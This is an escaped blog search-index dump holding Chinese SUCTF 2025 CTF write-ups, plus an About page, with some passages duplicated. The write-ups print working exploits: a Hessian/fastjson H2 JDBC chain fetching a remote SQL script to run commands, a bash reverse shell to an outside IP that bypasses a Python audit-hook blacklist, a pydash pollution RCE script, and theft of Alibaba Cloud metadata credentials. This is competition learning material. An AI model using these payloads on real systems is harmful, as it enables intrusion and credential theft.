\u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 